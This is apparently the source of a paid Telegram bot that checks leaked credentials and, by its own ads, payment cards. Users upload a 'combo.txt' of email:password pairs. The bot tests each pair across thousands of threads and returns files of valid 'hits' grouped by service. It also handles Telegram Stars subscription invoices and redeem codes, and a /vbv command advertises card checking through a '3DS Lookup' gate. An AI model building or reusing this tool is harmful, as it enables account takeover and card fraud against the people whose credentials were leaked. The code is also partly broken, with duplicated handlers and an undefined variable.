    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


@bot.message_handler(content_types=["successful_payment"])
def successful_payment(message):
    bot.send_message(message.chat.id, "تم الدفع بنجاح! شكرًا لاستخدامك الخدمة.")
    h=24
    with open('data.json', 'r') as json_file:
    	existing_data = json.load(json_file)
    	characters = string.ascii_uppercase + string.digits
    	pas ='NINJA-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
    	current_time = datetime.now()
    	ig = current_time + timedelta(hours=h)
    	plan='vip'
    	parts = str(ig).split(':')
    	ig = ':'.join(parts[:2])
    	with open('data.json', 'r') as json_file:
    		existing_data = json.load(json_file)
    		new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
    		existing_data.update(new_data)
    		with open('data.json', 'w') as json_file:
    			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
    			msg=f'''<b>
Payment Done Sucssesfully

This The Code 
You Can Redeem It Or Send It gift for your frined 

├𝗦𝗧𝗔𝗧𝗨𝗦»»»{plan}
├𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻»»»{ig}
├『Sso0ng』
├𝑲𝒆𝒚  <code>{pas}</code>	
├𝙐𝙨𝙖𝙜𝙚 /redeem [𝗞𝗘𝗬]
BOT 🕸
</b>'''
    			bot.send_message(message,msg,parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == 'buy_1week')
def process_payment(call):
    SERVICE_COST = '100'
    prices = [
        LabeledPrice(label="اشتراك لمده اسبوع", amount=SERVICE_COST * 1)
    ]  

    bot.send_invoice(
        chat_id=call.message.chat.id,
        title="اشتراك لمده اسبوع",
        description=f"ادفع {SERVICE_COST} نجمة للاشتراك اسبوع في البوت",
        provider_token="",
        currency="XTR",
        prices=prices,
        start_parameter="pay_with_stars",
        invoice_payload="Star-Payment-Payload",
    )


@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout_handler(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


@bot.message_handler(content_types=["successful_payment"])
def successful_payment(message):
    bot.send_message(message.chat.id, "تم الدفع بنجاح! شكرًا لاستخدامك الخدمة.")
    h=168
    with open('data.json', 'r') as json_file:
    	existing_data = json.load(json_file)
    	characters = string.ascii_uppercase + string.digits
    	pas ='NINJA-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
    	current_time = datetime.now()
    	ig = current_time + timedelta(hours=h)
    	plan='vip'
    	parts = str(ig).split(':')
    	ig = ':'.join(parts[:2])
    	with open('data.json', 'r') as json_file:
    		existing_data = json.load(json_file)
    		new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
    		existing_data.update(new_data)
    		with open('data.json', 'w') as json_file:
    			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
    			msg=f'''<b>
Payment Done Sucssesfully

This The Code 
You Can Redeem It Or Send It gift for your frined 

├𝗦𝗧𝗔𝗧𝗨𝗦»»»{plan}
├𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻»»»{ig}
├『Sso0ng』
├𝑲𝒆𝒚  <code>{pas}</code>	
├𝙐𝙨𝙖𝙜𝙚 /redeem [𝗞𝗘𝗬]
BOT :@NINJA_OUTLOOK_BOT🕸
</b>'''
    			bot.send_message(message,msg,parse_mode="HTML")
    			
    			
@bot.callback_query_handler(func=lambda call: call.data == 'buy_1month')
def process_payment(call):
    SERVICE_COST = '250'
    prices = [
        LabeledPrice(label="اشتراك لمده شهر", amount=SERVICE_COST * 1)
    ]  

    bot.send_invoice(
        chat_id=call.message.chat.id,
        title="اشتراك لمده شهر",
        description=f"ادفع {SERVICE_COST} نجمة للاشتراك شهرفي البوت",
        provider_token="",
        currency="XTR",
        prices=prices,
        start_parameter="pay_with_stars",
        invoice_payload="Star-Payment-Payload",
    )


@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout_handler(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


@bot.message_handler(content_types=["successful_payment"])
def successful_payment(message):
    bot.send_message(message.chat.id, "تم الدفع بنجاح! شكرًا لاستخدامك الخدمة.")
    h=720
    with open('data.json', 'r') as json_file:
    	existing_data = json.load(json_file)
    	characters = string.ascii_uppercase + string.digits
    	pas ='NINJA-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
    	current_time = datetime.now()
    	ig = current_time + timedelta(hours=h)
    	plan='vip'
    	parts = str(ig).split(':')
    	ig = ':'.join(parts[:2])
    	with open('data.json', 'r') as json_file:
    		existing_data = json.load(json_file)
    		new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
    		existing_data.update(new_data)
    		with open('data.json', 'w') as json_file:
    			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
    			msg=f'''<b>
Payment Done Sucssesfully

This The Code 
You Can Redeem It Or Send It gift for your frined 

├𝗦𝗧𝗔𝗧𝗨𝗦»»»{plan}
├𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻»»»{ig}
├『Sso0ng』
├𝑲𝒆𝒚  <code>{pas}</code>	
├𝙐𝙨𝙖𝙜𝙚 /redeem [𝗞𝗘𝗬]
BOT :@NINJA_OUTLOOK_BOT🕸
</b>'''
    			bot.send_message(message,msg,parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b>𝗡𝗜𝗡𝗝𝗔 𝗩𝗜𝗣 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗕𝗘𝗗 ✅

𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {timer}

𝗧𝗬𝗣 ➜ {typ}</b>'''

			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id ==ADMIN_ID:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='NINJA-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀
		
𝗣𝗟𝗔𝗡 ➜ {plan}
𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {ig}
𝗞𝗘𝗬 ➜ <code>{pas}</code>
		
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='3𝑫𝑺 𝑳𝒐𝒐𝒌𝒖𝒑'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Sso0ng")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
𝑻𝑯𝑰𝑺 𝑷𝑨𝑹𝑻𝑰𝑪𝑼𝑳𝑨𝑹 𝑩𝑶𝑻 𝑰𝑺 𝑵𝑶𝑻 𝑭𝑹𝑬𝑬 
𝑰𝑭 𝒀𝑶𝑼 𝑾𝑨𝑵𝑻 𝑻𝑶 𝑼𝑺𝑬 𝑰𝑻, 𝒀𝑶𝑼 𝑴𝑼𝑺𝑻 𝑷𝑼𝑹𝑪𝑯𝑨𝑺𝑬 𝑨 𝑾𝑬𝑬𝑲𝑳𝒀 𝑶𝑹 𝑴𝑶𝑵𝑻𝑯𝑳𝒀 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 

𝑻𝑯𝑬 𝑩𝑶𝑻'𝑺 𝑱𝑶𝑩 𝑰𝑺 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑪𝑨𝑹𝑫𝑺

𝑩𝑶𝑻 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝑷𝑹𝑰𝑪𝑬𝑺:
 
𝑬𝑮𝒀𝑷𝑻 
1 𝑾𝑬𝑬𝑲 > 250𝑬𝑮
1 𝑴𝑶𝑵𝑻𝑯 > 600𝑬𝑮

𝑰𝑹𝑨𝑸 
1 𝑾𝑬𝑬𝑲 ➜  6 𝑨𝑺𝑰𝑨 
1 𝑴𝑶𝑵𝑻𝑯 ➜  13 𝑨𝑺𝑰𝑨

𝑾𝑶𝑹𝑳𝑫𝑾𝑰𝑫𝑬 ➜  𝑼𝑺𝑫𝑻 
1 𝑾𝑬𝑬𝑲 ➜  6 
1 𝑴𝑶𝑵𝑻𝑯 ➜  13

𝑪𝑳𝑰𝑪𝑲 /𝑪𝑴𝑫𝑺 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/V7_XL")
    



# تعريف الدالة لمعالجة الملف المرسل
@bot.message_handler(content_types=['document'])
def handle_document(message):
    name = message.from_user.first_name
    with open('data.json', 'r') as file:
        json_data = json.load(file)
    id = message.from_user.id

    try:
        BL = (json_data[str(id)]['plan'])
    except:
        BL = '𝗙𝗥𝗘𝗘'

    if BL == '𝗙𝗥𝗘𝗘':
        # إرسال رسالة ترحيبية فقط إذا لم يكن لدى المستخدم اشتراك VIP
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Sso0ng")
        buy = types.InlineKeyboardButton("Buy Vip", callback_data='Buy')
        keyboard.add(contact_button)
        keyboard.add(buy)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
اسعار الاشتراك في خطة الVIP: 
يوم = 1
3 ايام = 2$
اسبوع = 3
شهر = 5$
----------------------------------
طرق الدفع :-
USDT 
TON 
يورزات ثلاثي 

━━━━━━━━━━━━━━━━━
Owner 
『𝗡𝗜𝗡𝗝𝗔』
''', reply_markup=keyboard)
        return




        with open('data.json', 'r') as file:
            json_data = json.load(file)
        json_data[str(id)]['timer'] = 'none'
        json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
        with open('data.json', 'w') as file:
            json.dump(json_data, file, indent=2)
        return

    # إذا كان كل شيء على ما يرام، تابع معالجة الملف
    global a, b
    a, b = 0, 0
    start_time = time.time()

    # تنزيل الملف المرسل
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    # حفظ الملف محليًا
    with open("combo.txt", "wb") as new_file:
        new_file.write(downloaded_file)

    # إرسال رسالة تفيد ببدء المعالجة
    sent_message = bot.send_message(
        message.chat.id,
        "**🔍 Processing Accounts...**\n\nPlease wait while we verify your accounts.",
        parse_mode="Markdown",
        reply_markup=generate_buttons()
    )

 # استخدام ThreadPoolExecutor لمعالجة الحسابات بشكل متوازي
    executor = ThreadPoolExecutor(max_workers=5000)

    def process_account(email, password):
        global a, b
        result = get_values(email, password, message.chat.id)

        if result:
            a += 1
        else:
            b += 1

        # تحديث الأزرار أثناء المعالجة
        bot.edit_message_reply_markup(
            chat_id=message.chat.id,
            message_id=sent_message.message_id,
            reply_markup=generate_buttons(start_time)
        )

    # قراءة الملف ومعالجة الحسابات
    with open("combo.txt", "r", encoding="utf-8") as f:
        for line in f:
            if ':' in line:
                email, password = line.strip().split(':', 1)
                executor.submit(process_account, email, password)

    # بعد الانتهاء من الفحص، عرض الأزرار التفاعلية لجميع الخدمات
  
    if all_hits:

        # إنشاء ملف لجميع الحسابات الصالحة

        filename = "all_hits.txt"

        with open(filename, "w") as file:

            file.write("\n".join(all_hits))

        

        # إرسال الملف إلى المستخدم

        with open(filename, "rb") as file:

            bot.send_document(call.message.chat.id, file, caption="**All Hits**")

        

        # حذف الملف بعد الإرسال

        os.remove(filename)

    else:

        bot.send_message(call.message.chat.id, "No valid accounts found.", parse_mode="Markdown")

# تعريف الدالة للتعامل مع الأزرار التفاعلية

@bot.callback_query_handler(func=lambda call: True)

def handle_callback(call):

    if call.data == "check_account":

        bot.send_message(call.message.chat.id, "📤 Please send the `combo.txt` file to check accounts.", parse_mode="Markdown")

    elif call.data == "show_stats":

        stats_message = f"""

        *📊 Statistics:*

        - ✅ Valid Accounts: `{a}`

        - ❌ Invalid Accounts: `{b}`

        """

        bot.send_message(call.message.chat.id, stats_message, parse_mode="Markdown")

    elif call.data == "send_file":

        bot.send_message(call.message.chat.id, "📤 The statistics file will be sent shortly.")

    elif call.data.startswith("show_"):

        service = call.data.split("_")[1]

        accounts = valid_accounts.get(service, [])

        if accounts:

            # إنشاء ملف للحسابات المرتبطة بالخدمة

            filename = f"{service}_accounts.txt"

            with open(filename, "w") as file:

                file.write("\n".join(accounts))

            

            # إرسال الملف إلى المستخدم

            with open(filename, "rb") as file:

                bot.send_document(call.message.chat.id, file, caption=f"**{service.capitalize()} Accounts**")

            

            # حذف الملف بعد الإرسال

            os.remove(filename)

        else:

            bot.send_message(call.message.chat.id, f"No accounts found for {service.capitalize()}.", parse_mode="Markdown")
@bot.message_handler(commands=['restart'])

def restart(message):

    bot.send_message(message.chat.id, "♻️ جارٍ إعادة تشغيل البوت...")

    

    # إعادة تشغيل البوت كأنه توقف وعاد للعمل

    os.execl(sys.executable, sys.executable, *sys.argv)

@bot.message_handler(commands=['all'])

def qwwe(message):

    if str(message.from_user.id) in myid:

        mp, erop = 0, 0

        try:

            idd = message.from_user.id

            mes = message.text.replace("/all ", "")

            bot.send_message(idd, mes)

            # تحميل قائمة المستخدمين من data.json

            with open('data.json', 'r') as file:

                json_data = json.load(file)

            # استخدام القفل لتأمين عملية الإرسال

            with send_lock:

                for user_id, details in json_data.items():

                    # إرسال الرسالة لكل المستخدمين بغض النظر عن خطة الاشتراك

                    try:

                        mp += 1

                        bot.send_message(user_id, text=mes)

                    except Exception as e:

                        erop += 1

                        print(f"Error sending message to user {user_id}: {e}")

            # الرد على المرسل بعد انتهاء العملية

            bot.reply_to(message, f'''- Hello Hassan

• Done Send - {mp}

• Bad Send - {erop}''')

        except Exception as err:

            bot.reply_to(message, f'- Was An error : {err}')

    else:

        bot.reply_to(message, "You are not authorized to use this command")
bot.infinity_polling()

